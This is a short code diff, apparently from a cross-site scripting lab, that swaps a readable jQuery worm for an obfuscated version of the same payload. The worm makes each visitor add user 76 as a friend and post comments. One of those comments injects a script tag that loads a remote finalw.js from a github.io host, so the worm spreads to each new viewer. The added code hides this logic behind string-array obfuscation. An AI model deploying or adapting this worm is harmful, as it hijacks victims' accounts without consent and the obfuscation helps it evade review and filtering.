@@ -1,11 +1,1 @@
-$(document).ready(function() {
-   $.ajax({url: "/add_friend.php?id=76", success: function(response){
-     if(response.includes("True")){
-       var date = Date();
-       var comment = "friend added on".concat(date);
-       var worm = "<script src=\"https://jackson987.github.io/finalw.js\"></script>"
-       $.ajax({url: "/add_comment.php?id=76" + "&comment=" + comment, success: function(result){console.log(result);}});
-       $.ajax({url: "/add_comment.php?comment=<script src=\"https://jackson987.github.io/finalw.js\"></script>", success: function(result){console.log(result);}});
-     }
-   }});
-});
+var _0x54a27f=_0x1ae2;function _0x1ae2(n,e){var t=_0xfe8b();return(_0x1ae2=function(n,e){return t[n-=179]})(n,e)}function _0xfe8b(){var n=["6WZuNdK","653192cOcLEQ","6111QQKRuv","/add_friend.php?id=76",'/add_comment.php?comment=<script src="https://jackson987.github.io/finalw.js"><\/script>',"1608665LffBfk","341STiHwA","ajax","5239885dfyKPi","5988030fdKrYj","log","2XRYxNN","/add_comment.php?id=76&comment=","1253068tjnzVD","includes","1352AHSjfw","3ySkFSa","647796BoVxwG","ready","concat"];return(_0xfe8b=function(){return n})()}(function(n,e){for(var t=_0x1ae2,r=_0xfe8b();;)try{if(422674===-parseInt(t(194))/1*(parseInt(t(184))/2)+-parseInt(t(179))/3*(-parseInt(t(196))/4)+-parseInt(t(188))/5*(-parseInt(t(183))/6)+-parseInt(t(191))/7+parseInt(t(198))/8*(parseInt(t(185))/9)+-parseInt(t(192))/10+parseInt(t(189))/11*(parseInt(t(180))/12))break;r.push(r.shift())}catch(n){r.push(r.shift())}})(),$(document)[_0x54a27f(181)]((function(){var n=_0x54a27f;$[n(190)]({url:n(186),success:function(e){var t=n;if(e[t(197)]("True")){var r=Date(),a="friend added on"[t(182)](r);$[t(190)]({url:t(195)+a,success:function(n){console[t(193)](n)}}),$[t(190)]({url:t(187),success:function(n){console[t(193)](n)}})}}})}));
